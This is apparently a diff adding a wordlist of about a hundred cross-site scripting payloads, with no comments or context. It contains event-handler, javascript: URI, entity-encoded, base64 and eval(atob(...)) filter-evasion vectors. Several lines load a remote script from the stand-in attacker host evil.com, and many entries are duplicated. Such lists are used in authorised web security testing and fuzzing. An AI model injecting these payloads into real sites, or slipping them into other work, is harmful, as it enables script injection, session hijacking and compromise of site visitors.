@@ -1,0 +1,100 @@
+"><svg/onload=alert(1)>
+"><img src=x onerror=alert(1)>
+<script>alert(1)</script>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
+"><svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>
+"><img src=x onerror="javascript:alert(1)">
+"><iframe src="javascript:alert(1)">
+<svg/onload=alert + (1)>
+"><svg onload=alert(1)//
+"><a href="javascript:alert(1)">Click
+<body onload=alert(1)>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]>
+<svg/onload="&#97;&#108;&#101;&#114;&#116;(1)">
+"><svg/onload=alert(1) //
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<svg/onload="this.src='data:image/svg+xml;base64,'+btoa(unescape(encodeURIComponent('<svg xmlns=http://www.w3.org/2000/svg onload=alert(1)>')))">
+<img src="x" onerror="this.onerror=null;alert(1)">
+<svg onload=alert&#40;1&#41;>
+"><img src=1 onerror=prompt(document.domain)>
+<script>confirm(1)</script>
+"><svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<img src="javascript:alert(1)">
+<svg><animate onbegin="alert(1)">
+<math><maction xlink:href="javascript:alert(1)">
+"><svg/onload=alert(1) x="y">
+<svg/onload="alert(1)">
+<img src=x onerror="alert&lpar;1&rpar;">
+"><img src=x onerror=alert&lpar;1&rpar;>
+<svg><script href="//evil.com/xss.js"></script></svg>
+<body onload=alert&lpar;1&rpar;>
+"><img src="x" onerror="javascript:alert(1)">
+<svg/onload="this.src='data:image/svg+xml;base64,'+btoa(unescape(encodeURIComponent('<svg xmlns=http://www.w3.org/2000/svg onload=alert(1)>')))">
+<iframe src="javascript:alert(1)"></iframe>
+<math><maction xlink:href="javascript:alert(1)"></maction></math>
+<svg><animateTransform onbegin="alert(1)">
+"><svg/onload=alert(String.fromCharCode(49))>
+<img src=x onerror=eval("alert(1)")>
+"><img src=x onerror=javascript:alert(1)>
+<svg onload="javascript:alert(1)">
+"><img src=1 onerror=alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+<svg/onload=eval(atob('YWxlcnQoMSk='))>
+<iframe src=javascript&colon;alert(1)>
+"><img src=x onerror=prompt(1)>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<script>alert(/XSS/)</script>
+"><iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
+<svg/onload=alert&#40;String.fromCharCode(49)&#41;>
+"><svg/onload=alert&#40;&#49;&#41;>
+<img src=1 onerror=javascript:alert(1)>
+<math><maction xlink:href=javascript:alert(1) />
+<iframe src=javascript:alert(1)>
+"><svg/onload="this.onerror=null;alert(1)">
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+"><img src="x" onerror="javascript:alert(1)">
+"><iframe src="data:text/html,<script>alert(1)</script>">
+"><img src=x onerror="this.onerror=null;alert(1)">
+<iframe src="javascript:alert(1)"></iframe>
+"><svg/onload="this.src='data:image/svg+xml;base64,'+btoa(unescape(encodeURIComponent('<svg xmlns=http://www.w3.org/2000/svg onload=alert(1)>')))">
+"><iframe src="javascript:alert(1)"></iframe>
+<svg/onload=eval(atob('YWxlcnQoMSk='))>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+"><img src=1 onerror=alert(1)>
+<svg><script href="//evil.com/xss.js"></script></svg>
+<img src=x onerror="alert&lpar;1&rpar;">
+"><img src=x onerror=alert&lpar;1&rpar;>
+<svg/onload=alert(String.fromCharCode(49))>
+"><img src=1 onerror=prompt(document.domain)>
+<script>confirm(1)</script>
+"><svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<img src="javascript:alert(1)">
+<svg><animate onbegin="alert(1)">
+<math><maction xlink:href="javascript:alert(1)">
+"><svg/onload=alert(1) x="y">
+<svg/onload="alert(1)">
+<img src=x onerror="alert&lpar;1&rpar;">
+"><img src=x onerror=alert&lpar;1&rpar;>
+<svg><script href="//evil.com/xss.js"></script></svg>
+<body onload=alert&lpar;1&rpar;>
+"><img src="x" onerror="javascript:alert(1)">
+<svg/onload="this.src='data:image/svg+xml;base64,'+btoa(unescape(encodeURIComponent('<svg xmlns=http://www.w3.org/2000/svg onload=alert(1)>')))">
+<iframe src="javascript:alert(1)"></iframe>
+<math><maction xlink:href="javascript:alert(1)"></maction></math>
+<svg><animateTransform onbegin="alert(1)">
+"><svg/onload=alert(String.fromCharCode(49))>
+<img src=x onerror=eval("alert(1)")>
+"><img src=x onerror=javascript:alert(1)>
+<svg onload="javascript:alert(1)">
+"><img src=1 onerror=alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+<svg/onload=eval(atob('YWxlcnQoMSk='))>
+<iframe src=javascript&colon;alert(1)>
+"><img src=x onerror=prompt(1)>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<script>alert(/XSS/)</script>
+"><iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
+<svg/onload=alert&#40;String.fromCharCode(49)&#41;>
+"><svg/onload=alert&#40;&#49;&#41;>
